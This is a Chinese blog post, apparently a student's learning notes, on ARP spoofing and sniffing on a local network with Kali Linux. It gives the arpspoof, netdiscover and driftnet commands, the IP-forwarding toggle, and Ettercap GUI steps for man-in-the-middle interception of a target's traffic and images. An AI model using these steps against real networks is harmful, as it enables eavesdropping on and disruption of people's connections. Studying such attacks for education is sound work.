---
title: kali进行arp嗅骗和攻击的一次记录
date: 2019-10-14T21:57:23.000Z
categories:
  - 网络安全
tags:
  - 网络安全 - kali
---

# Kali下arp嗅探和攻击的手账

由于本人打算考网络安全的专硕，所以这几天玩了一次kali。恩，怎么说呢，感触挺深的，特此记录下来

## arp基础

在我们进行各种高大上的讲解的时候，我们要先清楚一点，我们如何在网上进行各种活动的。 比如我们经常用的baidu,我们是如何访问到baidu的服务器的。

我们可以通过追踪路由来弄清楚这个问题

windows: tracert linux:traceroute

通过运行上面的命令我们可以看出数据包的传输过程 ![](https://s2.ax1x.com/2019/10/14/KpcYcR.png)

> 由于本人身处深山，所以网络查的可以，上面的图仅供参考

我们可以看到，我们的探测数据包经过了很多路由的转发最终达到了我们的机器上

并且，这里我们需要引出很重要的东西 -- **网关**

网关我们可以这么理解: 相信大家家里都有有线网了吧，我们其实可以把网关看成我们的那个接入网络的光猫路由器。

我们所有的数据包都是通过网关这个小东西传输。

现在，重点来了！！！！

> 敲黑板

假如，我们在同一个局域网下面，有两台机器，一台是我们自己，一台是需要攻击的机器。

那么，正常情况下，两台机器都有自己的ip地址 (192.168.x.x)，进行自己正常的网络服务,但是如果我们告诉对方机器现在我就是路由器，而且如果我的机器不能进行端口转发的时候，对面的机器就进不去网了。

需要注意的一点哈，现在我们告诉了对方机器我们是路由器，但是路由器还是可以给对面机器通信的。

这一点可以重复上面的操作，就是告诉路由器我们就是对面机器，进行双向嗅探来解决。

## 如何进行攻击

### 命令行方法

一、 获取对方信息

由于这篇博客写的是内网渗透，所以，我们需要扫描当前网络下的其他机器

```bash
  > ifconfig
```

![](https://s2.ax1x.com/2019/10/16/KiPr90.png)

先查看一下自己ip 里面重要的消息 有网卡和ip

这里说明一点,一般的话网关的最后一位数字一般都是1

```bash
  > netdiscover -i [网卡] -r [网关/24]
  example:
  > netdiscover -i eth0 -r 192.168.3.1/24
```

这样就可以获取对方ip，这里我只有一台电脑，我就不放图了

二、开始进行嗅探

```bash
arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host

> arpspoof -i eth0 [对方ip]  网关

```

双向嗅探

```bash
  > arpspoof -i eth0 [对方ip]  网关
  > arpspoof -i eth0 [网关]  对方ip
```

> 由于kali默认情况下是禁止端口转发的，所以现在的情况下对面机器是断网的

开启端口转发

```bash
  echo 1> /proc/sys/net/ipv4/ipforward
```

1是开启 0是关闭

> proc是目前开机的时候机器的配置，重启的话会重置

抓取对面图片

```bash
  driftnet -i eth0
```

### 软件嗅探

![](https://s2.ax1x.com/2019/10/16/KiFqkd.png)

具体做法

sniff->unified sniffing

host -> hostlist

host -> scan for host

![](https://s2.ax1x.com/2019/10/16/KikuBF.png)

网关IP add to target 1 靶机 add to target 2

Mitm->ARP poisoning

要记住选中第一项 第二项是单项ARP毒缓存 用于靶机会失败报警 单向欺骗网关

开启driftnet
